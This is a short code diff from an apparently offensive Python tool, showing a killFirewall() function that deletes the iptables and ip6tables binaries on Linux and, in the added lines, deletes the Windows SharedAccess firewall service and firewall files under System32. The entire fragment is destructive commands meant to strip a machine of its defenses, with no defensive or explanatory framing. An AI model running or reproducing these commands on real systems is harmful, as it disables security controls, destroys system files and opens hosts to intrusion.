@@ -153,7 +153,9 @@ def killFirewall(): #removes the firewall from the box
 		execute("rm -f $(which iptables)")
 		execute("rm -f $(which ip6tables)")
 	elif operatingSystem == "windows":
-		execute("del /F 'C:\\Windows\\System32\\WF.msc'")
+		execute("sc delete SharedAccess")
+		execute("del /F C:\\Windows\\System32\\WF.msc")
+		execute("del /F C:\\Windows\\System32\\firewall*")
 
 def flushFirewall(): #flushes the firewall rules
 	if (operatingSystem == "linux"):
